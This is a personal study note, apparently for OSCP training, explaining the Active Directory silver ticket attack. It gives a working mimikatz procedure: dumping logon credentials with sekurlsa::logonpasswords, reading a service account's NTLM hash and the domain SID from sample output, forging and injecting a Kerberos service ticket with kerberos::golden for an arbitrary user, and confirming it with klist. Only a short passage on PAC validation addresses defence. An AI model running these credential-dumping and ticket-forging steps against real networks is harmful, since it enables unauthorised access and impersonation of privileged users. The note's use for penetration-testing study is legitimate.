---
aliases:
  - Active Directory Password Attacks - Silver Ticket
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - active_directory
  - ad
  - adds
  - password_attack
  - silver_ticket
author: Mehdi N Tehrani
creat_date: 2024-01-07
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Overview
In Kerberos authentication, when a *service ticket* is provided to a *service provider*, the application on the server executing in the context of the service account checks the **user's permissions from the group memberships included in the service ticket**. But, the user and group permissions in the service ticket **are not verified by the application in a majority of environments**.

With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource with any permissions we desire.

## Mitigation
_Privileged Account Certificate_ [PAC](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962) [validation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84) is an **optional** verification process between the *SPN application* and the *domain controller*. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately for this attack technique, service applications rarely perform PAC validation.

# Attack
## Requirements
1. SPN password or NTLM hash
	- if the service account which has an associated SPN has a session on a machine, from which we can obtain NTLM hash
2. Target SPN
3. Domain SID

## Process
### mimikatz
#mimikatz #sekurlsa_logonpassword #kerberos_golden
#### 1. Obtain required details
```mimikatz
privilege::debug
sekurlsa::logonpasswords
```
Here we can find the NTLM hash of the service account
```

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09      <====
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
```
- Also from the service account SID we can obtain the domain SID 
	- if the user we want to forge silver ticket for and the SPN account are on the same domain
	- otherwise we can use `whoami /user`

In this example domain SID is:
```
S-1-5-21-1987370270-658905905-1781884369
```
which is the account SID, removing the last part

#### Forge silver ticket
```mimikatz
kerberos::golden /sid:<domain-sid> /domain:<domain> /ptt /target:<service-fqdn> /service:http /rc4:<spn_ntlm_hash> /user:<any_domain_user>
```
Example:
```mimikatz
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

Output:
```
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
```


This means we should have the ticket ready to use in memory. We can confirm this with [klist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist) which displays a list of currently cached Kerberos tickets.
```cmd
> klist

Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

